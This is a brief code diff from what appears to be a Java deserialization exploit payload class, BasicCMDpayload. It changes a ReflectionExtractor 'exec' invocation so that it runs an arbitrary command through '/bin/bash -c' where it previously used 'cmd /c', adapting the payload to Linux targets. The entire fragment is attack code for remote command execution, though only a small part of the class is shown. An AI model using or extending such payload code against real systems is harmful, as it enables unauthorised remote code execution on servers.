@@ -26,7 +26,7 @@ public class BasicCMDpayload {
 
         ReflectionExtractor extractor3 = new ReflectionExtractor(
                 "exec",
-                new Object[]{new String[]{"cmd", "/c", cmd}}
+                new Object[]{new String[]{"/bin/bash", "-c", cmd}}
         );
 
         ReflectionExtractor[] extractors = {
